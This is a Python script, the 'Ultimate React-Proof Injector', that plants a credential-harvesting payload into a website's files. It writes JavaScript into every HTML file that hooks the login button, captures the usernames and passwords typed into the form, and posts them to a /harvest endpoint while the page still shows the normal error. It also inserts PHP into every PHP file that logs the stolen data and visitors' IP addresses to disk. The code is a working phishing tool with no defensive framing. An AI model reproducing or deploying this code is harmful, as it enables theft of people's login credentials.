"""
Ultimate React-Proof Injector
"""
import os
import re

class ModernInjector:
    def __init__(self, site_dir, site_name, credentials_dir):
        self.site_dir = site_dir
        self.site_name = site_name
        self.credentials_dir = credentials_dir
        self.injection_stats = {'html_files': 0, 'php_files': 0, 'failed': 0}
        
    def inject_all(self):
        print(f"[*] Starting React-Proof injection for {self.site_name}")
        js_payload = self._generate_payload()
        self._inject_html(js_payload)
        self._inject_php()
        print(f"[*] Injection complete: {self.injection_stats}")
        return self.injection_stats
    
    def _generate_payload(self):
        return """
<!-- SCARFACE_REACT_PROOF -->
<script>
(function() {
    let hooked = false;
    console.log('[SCARFACE] React-proof loaded');

    function captureData(form) {
        if(!form) return;
        var data = {};
        var elements = form.elements;
        for(var i=0; i<elements.length; i++){
            var el = elements[i];
            if(el.name && el.value !== undefined && el.type !== 'submit' && el.type !== 'button') {
                data[el.name] = el.value;
            }
        }
        
        if(Object.keys(data).length === 0) {
            console.log('[SCARFACE] No data found');
            return;
        }

        console.log('[SCARFACE] ✅ CAPTURED CREDENTIALS:', data);
        
        fetch('/harvest', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data),
            keepalive: true
        }).then(r => r.json())
          .then(d => console.log('[SCARFACE] Server response:', d))
          .catch(e => console.log('[SCARFACE] Beacon error:', e));
    }

    function findAndHook() {
        if(hooked) return; // Prevent infinite spam!
        
        // Target the real "Log in" button
        var btn = document.querySelector('button, div[role="button"], input[type="submit"]');
        if(!btn) return;

        var text = (btn.textContent || btn.value || '').toLowerCase().trim();
        if(text.includes('log in') || text.includes('login')) {
            // Bypass React's event listening by overriding the native onclick directly
            btn.onclick = function(e) {
                var form = document.querySelector('form');
                if(form) {
                    console.log('[SCARFACE] Click intercepted!');
                    captureData(form);
                }
                // Returning true allows React's own click handler to still run (so it shows the "Wrong password" error)
                return true; 
            };
            
            hooked = true;
            console.log('[SCARFACE] Successfully hooked Login Button!');
        }
    }

    // Run immediately
    findAndHook();
    
    // Run once on DOM change, then stop (so it doesn't spam the console)
    var observer = new MutationObserver(function() {
        if(!hooked) {
            findAndHook();
        }
    });
    observer.observe(document.body, {childList: true, subtree: true});
})();
</script>
"""
    
    def _inject_html(self, js_payload):
        for root, _, files in os.walk(self.site_dir):
            for file in files:
                if file.lower().endswith('.html'):
                    html_file = os.path.join(root, file)
                    try:
                        with open(html_file, 'r', encoding='utf-8') as f:
                            content = f.read()
                        
                        # Clean out old scripts
                        new_content = re.sub(r'<!-- SCARFACE_.*?-->\s*<script>.*?</script>', '', content, flags=re.DOTALL)
                        
                        if '</body>' in new_content:
                            new_content = new_content.replace('</body>', js_payload + '\n</body>')
                        else:
                            new_content = new_content + js_payload
                        
                        if new_content == content:
                            continue
                        
                        backup = html_file + '.bak'
                        if not os.path.exists(backup):
                            with open(backup, 'w', encoding='utf-8') as f:
                                f.write(content)
                        
                        with open(html_file, 'w', encoding='utf-8') as f:
                            f.write(new_content)
                        
                        self.injection_stats['html_files'] += 1
                        print(f"[+] Injected: {os.path.relpath(html_file, self.site_dir)}")
                        
                    except Exception as e:
                        self.injection_stats['failed'] += 1
                        print(f"[!] Failed: {html_file} - {e}")
    
    def _inject_php(self):
        logger_code = f"""
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {{
    $data = json_decode(file_get_contents('php://input'), true);
    if (!$data) {{ parse_str(file_get_contents('php://input'), $data); }}
    
    $log_dir = '{os.path.join(self.credentials_dir, self.site_name)}';
    if (!file_exists($log_dir)) {{ mkdir($log_dir, 0777, true); }}
    
    $username = isset($data['username']) ? $data['username'] : (isset($data['email']) ? $data['email'] : 'unknown');
    $username = preg_replace('/[^a-zA-Z0-9._-]/', '_', $username);
    $timestamp = date('Ymd_His') . '_' . substr(microtime(), 2, 3);
    $filename = $log_dir . '/' . $username . '_' . $timestamp . '.json';
    
    file_put_contents($filename, json_encode([
        'timestamp' => date('Y-m-d H:i:s'),
        'data' => $data,
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
    ], JSON_PRETTY_PRINT));
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}}
?>
"""
        for root, _, files in os.walk(self.site_dir):
            for file in files:
                if file.lower().endswith('.php') and not file.endswith('.bak'):
                    php_file = os.path.join(root, file)
                    try:
                        with open(php_file, 'r', encoding='utf-8') as f:
                            content = f.read()
                        
                        if 'SCARFACE_REACT_PROOF' in content:
                            continue
                        
                        strpos = content.find('<?php')
                        if strpos != -1:
                            end_pos = content.find('?>', strpos)
                            if end_pos != -1:
                                new_content = content[:end_pos+2] + "\n" + logger_code + content[end_pos+2:]
                            else:
                                new_content = content + "\n" + logger_code
                        else:
                            new_content = logger_code + content
                        
                        backup = php_file + '.bak'
                        if not os.path.exists(backup):
                            with open(backup, 'w', encoding='utf-8') as f:
                                f.write(content)
                        
                        with open(php_file, 'w', encoding='utf-8') as f:
                            f.write(new_content)
                        
                        self.injection_stats['php_files'] += 1
                        print(f"[+] Injected PHP: {os.path.relpath(php_file, self.site_dir)}")
                    except Exception as e:
                        self.injection_stats['failed'] += 1

# Compatibility
def inject_logger_to_all_html(site_dir):
    injector = ModernInjector(site_dir, os.path.basename(site_dir), None)
    return injector._inject_html(injector._generate_payload())

def inject_logger_to_php(site_dir, site_name, credentials_dir):
    injector = ModernInjector(site_dir, site_name, credentials_dir)
    return injector._inject_php()
